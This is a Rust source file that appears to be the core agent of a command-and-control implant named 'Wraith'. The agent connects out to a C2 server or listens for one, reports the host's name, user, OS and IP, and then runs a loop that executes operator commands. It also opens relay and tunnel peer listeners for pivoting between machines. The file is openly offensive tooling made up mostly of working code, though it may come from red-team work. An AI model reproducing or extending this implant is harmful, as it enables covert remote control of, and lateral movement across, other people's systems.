use crate::commands::relay::RelayCommands;
use crate::connection::Connection;
use crate::connection::tcp::TcpConnection;
use crate::message::codec::MessageCodec;
use crate::proto::wraith::{MessageType, WraithMessage};
use crate::relay::RelayManager;
use crate::wraith::dispatcher::MessageDispatcher;
use crate::wraith::state::WraithState;
use crate::wraith::tunnel::TunnelManager;
use log::{error, info};
use std::sync::{Arc, Mutex};

pub struct Wraith {
    connection: TcpConnection,
    state: Arc<Mutex<WraithState>>,
    dispatcher: MessageDispatcher,
    tunnel_manager: Arc<TunnelManager>,
    agent_mode: bool,
    peer_listen_addr: Option<String>,
    peer_connect_addr: Option<String>,
}

impl Wraith {
    pub fn new(host: String, port: u16, is_server: bool) -> Self {
        let relay_manager = Arc::new(Mutex::new(RelayManager::new()));
        let tunnel_manager = Arc::new(TunnelManager::new());
        let state = Arc::new(Mutex::new(WraithState::new_with_relay_manager(relay_manager.clone())));
        let relay_commands = RelayCommands::new(relay_manager.clone());

        Self {
            connection: TcpConnection::new(host, port, is_server),
            state,
            dispatcher: MessageDispatcher::new(relay_commands),
            tunnel_manager,
            agent_mode: false,
            peer_listen_addr: None,
            peer_connect_addr: None,
        }
    }

    /// Create Wraith in agent listener mode (waits for C2 connections)
    pub fn new_agent_listener(host: String, port: u16) -> Self {
        let relay_manager = Arc::new(Mutex::new(RelayManager::new()));
        let tunnel_manager = Arc::new(TunnelManager::new());
        let state = Arc::new(Mutex::new(WraithState::new_with_relay_manager(relay_manager.clone())));
        let relay_commands = RelayCommands::new(relay_manager.clone());

        Self {
            connection: TcpConnection::new("0.0.0.0".to_string(), port, true),
            state,
            dispatcher: MessageDispatcher::new(relay_commands),
            tunnel_manager,
            agent_mode: true,
            peer_listen_addr: Some(format!("{}:{}", host, port)),
            peer_connect_addr: None,
        }
    }

    /// Create Wraith in agent connect mode (connects to C2)
    pub fn new_agent_connect(host: String, port: u16) -> Self {
        let relay_manager = Arc::new(Mutex::new(RelayManager::new()));
        let tunnel_manager = Arc::new(TunnelManager::new());
        let state = Arc::new(Mutex::new(WraithState::new_with_relay_manager(relay_manager.clone())));
        let relay_commands = RelayCommands::new(relay_manager.clone());

        Self {
            connection: TcpConnection::new(host.clone(), port, false),
            state,
            dispatcher: MessageDispatcher::new(relay_commands),
            tunnel_manager,
            agent_mode: true,
            peer_listen_addr: None,
            peer_connect_addr: Some(format!("{}:{}", host, port)),
        }
    }

    pub async fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        if self.connection.is_server() {
            self.connection.listen().await?;
        } else {
            self.connection.connect().await?;
        }

        self.state.lock().unwrap().set_connected(true);
        self.register().await?;

        loop {
            match self.connection.read_message().await {
                Ok(msg) => {
                    let msg_type = msg.msg_type;
                    match msg_type {
                        x if x == MessageType::Command as i32 => {
                            if let Some(response) = self.dispatcher.dispatch(msg, self.state.clone()).await {
                                self.connection.send_message(&response).await?;
                            }
                        }
                        _ => {
                            info!("Received message type: {}", msg_type);
                        }
                    }
                }
                Err(e) => {
                    error!("Read failed: {}", e);
                    break;
                }
            }
        }

        self.state.lock().unwrap().set_connected(false);
        Ok(())
    }

    async fn register(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let state = self.state.lock().unwrap();
        let msg = MessageCodec::create_registration(
            state.hostname.clone(),
            state.username.clone(),
            state.os.clone(),
            state.ip_address.clone(),
        );
        drop(state);

        self.connection.send_message(&msg).await?;
        info!("Registration sent");
        Ok(())
    }

    pub async fn run_agent_listener(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        // Start listening for C2
        self.connection.listen().await?;
        self.state.lock().unwrap().set_connected(true);
        self.register().await?;

        // Start peer listener if configured
        if let Some(addr) = &self.peer_listen_addr {
            let tunnel_manager = Arc::clone(&self.tunnel_manager);
            let addr_clone = addr.clone();
            tokio::spawn(async move {
                if let Err(e) = tunnel_manager.start_peer_listener(&addr_clone).await {
                    error!("Peer listener error: {}", e);
                }
            });
        }

        // Main command loop
        loop {
            match self.connection.read_message().await {
                Ok(msg) => {
                    if let Some(response) = self.dispatcher.dispatch(msg, self.state.clone()).await {
                        self.connection.send_message(&response).await?;
                    }
                }
                Err(e) => {
                    error!("Read failed: {}", e);
                    break;
                }
            }
        }
        Ok(())
    }

    pub async fn run_agent_connect(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        // Connect to C2
        self.connection.connect().await?;
        self.state.lock().unwrap().set_connected(true);
        self.register().await?;

        // Start peer listener if configured
        if let Some(addr) = &self.peer_listen_addr {
            let tunnel_manager = Arc::clone(&self.tunnel_manager);
            let addr_clone = addr.clone();
            tokio::spawn(async move {
                if let Err(e) = tunnel_manager.start_peer_listener(&addr_clone).await {
                    error!("Peer listener error: {}", e);
                }
            });
        }

        // Also connect to peer if configured
        if let Some(_addr) = &self.peer_connect_addr {
            // TODO: Implement peer connection establishment
        }

        // Main command loop
        loop {
            match self.connection.read_message().await {
                Ok(msg) => {
                    if let Some(response) = self.dispatcher.dispatch(msg, self.state.clone()).await {
                        self.connection.send_message(&response).await?;
                    }
                }
                Err(e) => {
                    error!("Read failed: {}", e);
                    break;
                }
            }
        }
        Ok(())
    }
}